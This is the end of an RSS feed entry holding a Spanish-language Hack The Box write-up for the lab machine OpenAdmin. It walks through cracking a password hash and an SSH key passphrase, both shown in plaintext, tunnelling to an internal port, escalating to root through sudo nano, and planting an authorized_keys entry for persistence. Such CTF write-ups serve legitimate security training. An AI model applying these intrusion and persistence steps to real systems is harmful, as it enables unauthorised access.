&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-58-12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al ejecutarlo nos muestra un error:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-58-12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Pero la solicitud la hace hacia el localhost de la maquina en un puerto que no es publico.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-59-54.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En /var/www/internal, vemos que en archivo index.php existe una contraseña encriptada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-55-05.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Con la ayuda de crackstation logramos obtener en texto plano la contraseña:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-56-03.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Credenciales:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;jimmy:Revealed
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ahora que conocemos todo esto, traemos localmente el puerto 52846 utilizando SSH, visitamos la pagina y nos muestra un panel de logeo.&lt;/p&gt;
&lt;p&gt;SSH:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh -L 8080:localhost:52846 jimmy@10.10.10.171
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Netstat:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_20-04-04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Panel:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_20-04-30.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ingresamos las credenciales que obtuvimos en el archivo index, y nos muestra una clave privada de SSH encryptada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_20-05-30.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos john the ripper para crackear la frase e iniciar sesion con la clave privada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_20-07-33.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Frase:bloodninjas
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;SSH Joanna:&lt;br /&gt;
Obtenemos una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_20-09-01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;Utilizamos sudo para ver los comandos que podemos utilizar sin contraseña, vemos que nano es uno de ellos, con la ayuda de &lt;a href=&#34;https://gtfobins.github.io/gtfobins/nano/&#34;&gt;&lt;strong&gt;GTFOBbins - nano&lt;/strong&gt;&lt;/a&gt; obtenemos una shell commo root y con ello nuestra flag &lt;strong&gt;root&lt;/strong&gt;.txt.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_20-12-30.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;BTW Podemos agregar nuestra clave publica al archivo &lt;code&gt;authorized_keys&lt;/code&gt; del usuario root e iniciar sesion con nuestra clave privada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_20-15-08.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/openadmin/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/openadmin/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>OpenNetAdmin</category>
            
          
            
              <category>nano</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>windows</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>